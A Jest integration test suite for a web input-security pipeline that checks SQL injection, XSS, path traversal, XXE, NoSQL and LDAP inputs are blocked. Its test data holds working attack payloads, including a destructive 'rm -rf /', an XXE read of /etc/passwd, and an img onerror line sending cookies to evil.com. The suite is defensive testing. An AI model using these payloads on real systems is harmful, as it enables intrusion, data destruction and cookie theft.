/**
 * Security Framework Integration Test Suite
 * @description End-to-end tests for the complete security validation pipeline
 */

import { InputSanitizer, DEFAULT_SEARCH_POLICY } from '../InputSanitizer';
import { SecurityGuard } from '../SecurityGuard';
import { InputValidator } from '../InputValidator';
import { CharacterFilter } from '../CharacterFilter';
import { QueryLengthEnforcer } from '../QueryLengthEnforcer';
import { ValidationReporter } from '../ValidationReporter';
import { SecurityConfig, SQLInjectionConfig, XSSProtectionConfig, CharacterFilterConfig, LengthValidationConfig } from '../../types/Security';

describe('Security Framework Integration', () => {
  let sanitizer: InputSanitizer;
  let securityGuard: SecurityGuard;
  let validator: InputValidator;
  let characterFilter: CharacterFilter;
  let lengthEnforcer: QueryLengthEnforcer;
  let reporter: ValidationReporter;

  beforeEach(() => {
    const securityConfig: SecurityConfig = {
      inputSanitization: true,
      maxQueryLength: 1000,
      xssProtection: true,
      sqlInjectionProtection: true,
      bufferOverflowProtection: true,
      securityLogging: true
    };

    const xssConfig: XSSProtectionConfig = {
      allowedTags: ['b', 'i', 'em', 'strong'],
      allowedAttributes: ['class'],
      blockScripts: true,
      blockEventHandlers: true,
      blockDataUrls: true
    };

    const sqlConfig: SQLInjectionConfig = {
      enforceParameterized: true,
      blockedKeywords: ['DROP', 'DELETE', 'INSERT', 'UPDATE', 'UNION', 'SELECT'],
      injectionPatterns: [
        /(\bunion\b.*\bselect\b)|(\bselect\b.*\bunion\b)/i,
        /(\band\b|\bor\b)\s+\d+\s*[=<>]\s*\d+/i
      ],
      escapeSpecialChars: true,
      allowStoredProcedures: false
    };

    const characterConfig: CharacterFilterConfig = {
      removeCharacters: ['\0', '\r'],
      escapeCharacters: ['<', '>', '"', "'"],
      allowUnicode: true,
      allowInternational: true
    };

    const lengthConfig: LengthValidationConfig = {
      minLength: 1,
      maxLength: 1000,
      bufferLimit: 10000,
      onExceeded: 'reject'
    };

    sanitizer = new InputSanitizer(securityConfig, xssConfig);
    securityGuard = new SecurityGuard(securityConfig, sqlConfig);
    validator = new InputValidator(undefined, lengthConfig);
    characterFilter = new CharacterFilter(characterConfig);
    lengthEnforcer = new QueryLengthEnforcer(lengthConfig);
    reporter = new ValidationReporter({ includeDetails: true, sanitizeMessages: true });
  });

  describe('Complete Security Pipeline', () => {
    const processInput = (input: string) => {
      // Step 1: Length validation
      const lengthResult = lengthEnforcer.enforceLength(input);
      if (!lengthResult.isSecure) {
        return { stage: 'length', result: lengthResult };
      }

      // Step 2: Character filtering
      const { filtered, warnings: charWarnings } = characterFilter.filter(input);
      
      // Step 3: Input validation
      const validationResult = validator.validate(filtered);
      if (!validationResult.isSecure) {
        return { stage: 'validation', result: validationResult };
      }

      // Step 4: Security guard check
      const securityResult = securityGuard.validateInput(filtered);
      if (!securityResult.isSecure) {
        return { stage: 'security', result: securityResult };
      }

      // Step 5: XSS validation
      const xssResult = sanitizer.validateForXSS(filtered);
      if (!xssResult.isSecure) {
        return { stage: 'xss', result: xssResult };
      }

      // Step 6: Final sanitization
      const sanitized = sanitizer.sanitize(filtered, DEFAULT_SEARCH_POLICY);

      return {
        stage: 'complete',
        result: {
          isSecure: true,
          errors: [],
          warnings: charWarnings,
          riskLevel: 'low' as const,
          recommendations: []
        },
        sanitized
      };
    };

    test('should process safe input through complete pipeline', () => {
      const safeInput = 'normal search query';
      const result = processInput(safeInput);
      
      expect(result.stage).toBe('complete');
      expect(result.result.isSecure).toBe(true);
      expect(result.sanitized).toBe(safeInput);
    });

    test('should block SQL injection at security stage', () => {
      const sqlInjection = "'; DROP TABLE users; --";
      const result = processInput(sqlInjection);
      
      expect(result.stage).toBe('security');
      expect(result.result.isSecure).toBe(false);
      expect(result.result.errors.some(e => e.type === 'sql_injection')).toBe(true);
    });

    test('should block XSS at XSS validation stage', () => {
      const xssAttack = '<script>alert("xss")</script>';
      const result = processInput(xssAttack);
      
      expect(result.stage).toBe('xss');
      expect(result.result.isSecure).toBe(false);
      expect(result.result.errors.some(e => e.type === 'xss')).toBe(true);
    });

    test('should block oversized input at length stage', () => {
      const oversizedInput = 'a'.repeat(15000);
      const result = processInput(oversizedInput);
      
      expect(result.stage).toBe('length');
      expect(result.result.isSecure).toBe(false);
      expect(result.result.errors.some(e => e.type === 'buffer_overflow')).toBe(true);
    });
  });

  describe('Multi-Vector Attack Detection', () => {
    test('should detect combined SQL injection and XSS attack', () => {
      const combinedAttack = "'; DROP TABLE users; --<script>alert('xss')</script>";
      const securityResult = securityGuard.validateInput(combinedAttack);
      const xssResult = sanitizer.validateForXSS(combinedAttack);
      
      expect(securityResult.isSecure).toBe(false);
      expect(xssResult.isSecure).toBe(false);
      expect(securityResult.errors.some(e => e.type === 'sql_injection')).toBe(true);
      expect(xssResult.errors.some(e => e.type === 'xss')).toBe(true);
    });

    test('should handle path traversal with command injection', () => {
      const pathCommand = '../../../etc/passwd; rm -rf /';
      const result = securityGuard.validateInput(pathCommand);
      
      expect(result.isSecure).toBe(false);
      expect(result.errors.length).toBeGreaterThan(1);
      expect(result.riskLevel).toMatch(/high|critical/);
    });
  });

  describe('Performance Under Load', () => {
    test('should handle multiple concurrent validations', async () => {
      const inputs = [
        'safe query 1',
        "'; DROP TABLE users; --",
        '<script>alert(1)</script>',
        'normal text with unicode: 测试',
        'a'.repeat(500)
      ];

      const startTime = Date.now();
      const results = await Promise.all(
        inputs.map(async input => {
          const lengthResult = lengthEnforcer.enforceLength(input);
          const validationResult = validator.validate(input);
          const securityResult = securityGuard.validateInput(input);
          const xssResult = sanitizer.validateForXSS(input);
          
          return { input, lengthResult, validationResult, securityResult, xssResult };
        })
      );
      const endTime = Date.now();

      expect(endTime - startTime).toBeLessThan(200); // Should complete within 200ms
      expect(results).toHaveLength(inputs.length);
      
      // Verify results
      expect(results[0].securityResult.isSecure).toBe(true); // Safe query
      expect(results[1].securityResult.isSecure).toBe(false); // SQL injection
      expect(results[2].xssResult.isSecure).toBe(false); // XSS attack
    });

    test('should maintain performance with large inputs', () => {
      const largeInput = 'safe text content '.repeat(1000);
      
      const startTime = Date.now();
      const lengthResult = lengthEnforcer.enforceLength(largeInput);
      const validationResult = validator.validate(largeInput);
      const securityResult = securityGuard.validateInput(largeInput);
      const endTime = Date.now();

      expect(endTime - startTime).toBeLessThan(50); // Should be fast for safe content
      expect(lengthResult.isSecure).toBe(true);
      expect(validationResult.isSecure).toBe(true);
      expect(securityResult.isSecure).toBe(true);
    });
  });

  describe('Reporting Integration', () => {
    test('should generate comprehensive security reports', () => {
      const maliciousInput = "'; DROP TABLE users; --<script>alert(1)</script>";
      
      // Run through security validation
      const securityResult = securityGuard.validateInput(maliciousInput);
      const xssResult = sanitizer.validateForXSS(maliciousInput);
      
      // Generate reports
      const securityReport = reporter.generateReport(securityResult, 'detailed');
      const xssReport = reporter.generateReport(xssResult, 'detailed');
      
      expect(securityReport.isValid).toBe(false);
      expect(securityReport.errors.length).toBeGreaterThan(0);
      expect(securityReport.recommendations.length).toBeGreaterThan(0);
      
      expect(xssReport.isValid).toBe(false);
      expect(xssReport.errors.length).toBeGreaterThan(0);
    });

    test('should provide user-friendly error messages', () => {
      const sqlInjection = "'; DROP TABLE users; --";
      const result = securityGuard.validateInput(sqlInjection);
      const report = reporter.generateReport(result, 'minimal');
      
      expect(report.message).toContain('validation failed');
      expect(report.errors.every(error => !error.includes('DROP TABLE'))).toBe(true); // Sanitized
    });
  });

  describe('Real-World Attack Scenarios', () => {
    const realWorldAttacks = [
      {
        name: 'WordPress SQL Injection',
        payload: "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
      },
      {
        name: 'Stored XSS via Image',
        payload: '<img src=x onerror="document.location=\'http://evil.com/steal.php?cookie=\'+document.cookie">'
      },
      {
        name: 'NoSQL Injection',
        payload: '{"$ne": null}'
      },
      {
        name: 'LDAP Injection',
        payload: '*)(uid=*))(|(uid=*'
      },
      {
        name: 'XML External Entity',
        payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
      }
    ];

    realWorldAttacks.forEach(attack => {
      test(`should detect and block: ${attack.name}`, () => {
        const securityResult = securityGuard.validateInput(attack.payload);
        const xssResult = sanitizer.validateForXSS(attack.payload);
        const validationResult = validator.validate(attack.payload);
        
        // At least one security check should fail
        const isBlocked = !securityResult.isSecure || !xssResult.isSecure || !validationResult.isSecure;
        expect(isBlocked).toBe(true);
      });
    });
  });

  describe('Configuration Consistency', () => {
    test('should maintain consistent behavior across components', () => {
      const testInput = '<script>alert(1)</script>';
      
      // All components should agree on security status
      const sanitizerResult = sanitizer.validateForXSS(testInput);
      const guardResult = securityGuard.validateInput(testInput);
      const validatorResult = validator.validate(testInput);
      
      expect(sanitizerResult.isSecure).toBe(false);
      expect(guardResult.isSecure).toBe(false);
      expect(validatorResult.isSecure).toBe(false);
    });

    test('should handle configuration updates consistently', () => {
      // Update length configuration
      const newLengthConfig: LengthValidationConfig = {
        minLength: 5,
        maxLength: 100,
        bufferLimit: 1000,
        onExceeded: 'truncate'
      };
      
      lengthEnforcer.updateConfig(newLengthConfig);
      
      const shortInput = 'hi';
      const result = lengthEnforcer.enforceLength(shortInput);
      
      expect(result.isSecure).toBe(false);
      expect(result.errors.some(e => e.message.includes('too short'))).toBe(true);
    });
  });

  describe('Error Recovery and Graceful Degradation', () => {
    test('should handle malformed input gracefully', () => {
      const malformedInputs = [
        null,
        undefined,
        123 as any,
        {} as any,
        [] as any
      ];

      malformedInputs.forEach(input => {
        expect(() => {
          validator.validate(input);
          securityGuard.validateInput(input);
          lengthEnforcer.enforceLength(input);
        }).not.toThrow();
      });
    });

    test('should continue processing after non-critical errors', () => {
      const inputWithWarnings = 'test with unicode: 测试 and special chars: !@#$%';
      
      const { filtered, warnings } = characterFilter.filter(inputWithWarnings);
      const validationResult = validator.validate(filtered);
      
      expect(filtered).toBeDefined();
      expect(validationResult.isSecure).toBe(true);
      // May have warnings but should not fail
    });
  });
});
